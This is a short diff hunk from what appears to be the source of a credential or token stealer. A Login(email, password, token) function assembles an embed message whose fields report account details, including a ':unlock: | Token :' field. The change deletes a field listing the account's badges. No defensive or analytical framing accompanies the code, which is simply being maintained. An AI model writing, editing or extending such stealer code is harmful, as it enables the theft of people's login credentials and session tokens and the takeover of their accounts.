@@ -154,11 +154,6 @@ function Login(email, password, token) {
                             "inline": false
                         },
 
-                        {
-                            "name": "badge_type :",
-                            "value": "\`${GetBadges(json.flags)}\`",
-                            "inline": false
-                        }
 
                         {
                             "name": ":unlock: | Token :",
